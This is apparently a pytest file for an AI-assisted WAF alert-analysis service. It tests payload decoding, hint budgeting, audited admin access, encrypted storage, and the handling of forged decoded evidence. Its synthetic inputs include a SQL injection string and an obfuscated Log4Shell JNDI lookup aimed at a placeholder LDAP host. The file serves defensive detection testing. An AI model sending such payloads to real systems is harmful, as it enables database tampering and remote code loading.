import copy
import json

import pytest
from sqlalchemy import select

from app import worker
from app.agent.executor import AgentCallResult
from app.agent.input_builder import build_agent_input
from app.models import AccessAudit, AgentStep, Analysis, VLLMProfile
from app.services.crypto import CryptoService
from app.services.http_parser import parse_http_payload
from app.services.payload_decoding import DECODER_VERSION, decode_payload
from test_moduagent_worker import primary_output

pytestmark = pytest.mark.usefixtures("registered_vllm_target")


RAW = "GET /search?q=%27%20OR%201%3D1--&next=%252Fadmin HTTP/1.1\r\nHost: synthetic.test\r\n\r\n"
JNDI_RAW_EXCERPT = "${${lower:J}ndi:ldap://synthetic.invalid/a}"
JNDI_RAW = "GET / HTTP/1.1\r\nX-Synthetic: " + JNDI_RAW_EXCERPT + "\r\n\r\n"


def build(raw=RAW, *, context_window=8192, max_output_tokens=1024, decoding=None):
    return build_agent_input(
        {"event_id": "synthetic-decoding"}, raw, parse_http_payload(raw), context_window, max_output_tokens,
        decoding=decode_payload(raw) if decoding is None else decoding,
    )


def test_whole_decoding_items_are_in_budget_and_keep_exact_original_provenance():
    decoding = decode_payload(RAW)
    before = copy.deepcopy(decoding)
    built = build(decoding=decoding)
    doc = json.loads(built.text)
    assert len(built.text) <= (8192 - 1024 - 4096) * 3
    assert doc["event"]["payload"] == RAW
    assert doc["decoded_payload_hints"]["items"]
    for item in doc["decoded_payload_hints"]["items"]:
        assert RAW[item["start"]:item["end"]] == item["original"]
        assert item["original"] in doc["event"]["payload"]
        assert item in decoding["items"]
    assert decoding == before


def test_omitted_occurrence_cannot_use_identical_text_from_a_retained_occurrence():
    raw = "GET /?q=%2Ftest HTTP/1.1\r\n\r\n" + "x" * 12000 + " %2Ftest " + "y" * 12000
    decoding = decode_payload(raw)
    assert len(decoding["items"]) == 2
    built = build(raw, decoding=decoding)
    hints = json.loads(built.text)["decoded_payload_hints"]
    assert built.input_truncated
    assert hints["omitted_items"]
    assert all(item["start"] < 12000 for item in hints["items"])


def test_many_hints_are_selected_whole_not_clipped_into_fictitious_transformations():
    raw = "GET /?" + "&".join(f"q{i}=%2F{'x' * 200}" for i in range(25)) + " HTTP/1.1\r\n\r\n"
    decoding = decode_payload(raw)
    built = build(raw, decoding=decoding)
    hints = json.loads(built.text)["decoded_payload_hints"]
    assert hints["omitted_items"]
    assert all(item in decoding["items"] for item in hints["items"])
    assert len(built.text) <= (8192 - 1024 - 4096) * 3


def test_decoder_read_is_admin_audited_and_does_not_modify_existing_analysis(client, event_payload, service_headers):
    event_payload["payload"] = RAW
    analysis_id = client.post("/api/v1/analyses", json=event_payload, headers=service_headers).json()["id"]
    path = f"/api/v1/analyses/{analysis_id}/event"
    assert client.get(path, headers=service_headers).status_code == 403
    with client.app.state.session_factory() as db:
        row = db.get(Analysis, analysis_id)
        before = (row.payload_ciphertext, row.event_fingerprint, row.result_json, row.status)
    client.post("/api/v1/auth/login", json={"username": "admin", "password": "test-password"})
    response = client.get(path)
    assert response.status_code == 200
    assert response.json()["payload"] == RAW
    assert response.json()["decoding"]["decoder_version"] == DECODER_VERSION
    assert response.json()["decoding"]["items"]
    with client.app.state.session_factory() as db:
        row = db.get(Analysis, analysis_id)
        assert (row.payload_ciphertext, row.event_fingerprint, row.result_json, row.status) == before
        assert db.scalar(select(AccessAudit).where(AccessAudit.action == "view_raw_event")) is not None
        assert db.scalar(select(AgentStep)) is None


@pytest.mark.parametrize("forged_decoded_evidence", [False, True])
@pytest.mark.parametrize("raw,original_excerpt,decoded_excerpt", [
    (RAW, "%27%20OR%201%3D1--", "' OR 1=1--"),
    (JNDI_RAW, JNDI_RAW_EXCERPT, "${jndi:ldap://synthetic.invalid/a}"),
])
def test_worker_uses_identical_tool_hints_in_independent_calls_and_keeps_artifacts_encrypted(
    client, event_payload, service_headers, settings, monkeypatch, forged_decoded_evidence,
    raw, original_excerpt, decoded_excerpt,
):
    event_payload["payload"] = raw
    event_payload["waf_action"] = "A"  # Existing policy requests an independent verifier.
    analysis_id = client.post("/api/v1/analyses", json=event_payload, headers=service_headers).json()["id"]
    calls = []

    async def fake_execute(**kwargs):
        calls.append(kwargs)
        excerpt = decoded_excerpt if forged_decoded_evidence else original_excerpt
        field = "payload.query" if raw == RAW else "payload.headers.X-Synthetic"
        return AgentCallResult(
            output=primary_output(excerpt=excerpt, field=field), framework_run_id=f"synthetic-{len(calls)}",
            agent_fingerprint="synthetic-fingerprint", finish_reason="completed", failure_id=None, error=None,
            telemetry={"framework": "moduagent", "framework_version": "0.6.2", "tool_trace": []},
        )

    monkeypatch.setattr(worker, "execute_structured_agent", fake_execute)
    crypto = CryptoService(settings.data_encryption_key, settings.encryption_key_version)
    with client.app.state.session_factory() as db:
        db.add(VLLMProfile(name="synthetic-decoder", base_url="http://10.0.0.10:8000/v1", model_name="synthetic", status="production"))
        db.commit()
        row = db.get(Analysis, analysis_id)
        before = (row.payload_ciphertext, row.event_fingerprint)
        worker.process_moduagent(db, crypto, row, "10.0.0.10:8000", 0.75)
        assert len(calls) == 2
        assert calls[0]["user_input"] == calls[1]["user_input"]
        doc = json.loads(calls[0]["user_input"])
        assert doc["decoded_payload_hints"]["items"]
        assert "primary" not in doc
        assert (row.payload_ciphertext, row.event_fingerprint) == before
        step = db.scalar(select(AgentStep).where(AgentStep.step_type == "decoder"))
        saved = json.loads(crypto.decrypt_text(step.output_ciphertext))
        assert saved["items"] == decode_payload(raw)["items"]
        assert step.metadata_json["execution"] == "deterministic_local_preprocessor"
        assert step.metadata_json["llm_called"] is False
        assert "original" not in json.dumps(step.metadata_json)
        assert "decoded_payload_hints" not in json.dumps(row.result_json)
        assert "decoding" not in row.result_json
        assert row.result_json["agent"]["tools"] == []
        assert row.result_json["agent"]["preprocessors"] == [DECODER_VERSION]
        assert row.result_json["analyst_guidance"]["checks"]
        assert row.verdict == ("inconclusive" if forged_decoded_evidence else "true_positive")
        if forged_decoded_evidence:
            assert row.result_json["evidence"] == []


def test_unchanged_jndi_warning_is_a_whole_bounded_model_hint():
    raw = "GET / HTTP/1.1\r\nX-Synthetic: ${jndi:ldap://synthetic.invalid/a}\r\n\r\n"
    hints = json.loads(build(raw).text)["decoded_payload_hints"]
    assert len(hints["items"]) == 1
    item = hints["items"][0]
    assert item["steps"] == []
    assert item["original"] == item["decoded"] == raw[item["start"]:item["end"]]
    assert "jndi_lookup_not_executed" in item["warnings"]


def test_agent_instructions_keep_lookup_candidates_distinct_from_observed_execution():
    from app.agent.prompts import BASE_INSTRUCTIONS, PROMPT_VERSION

    assert PROMPT_VERSION == "waf-judgment-v2.5"
    for marker in ["log4j_lookup_static", "unresolved_lookup", "default_lookup_candidate", "base64_padding_inferred"]:
        assert marker in BASE_INSTRUCTIONS
    assert "외부 연결 기록이 없다고 공격 시도 자체를 부정하지 않는다" in BASE_INSTRUCTIONS
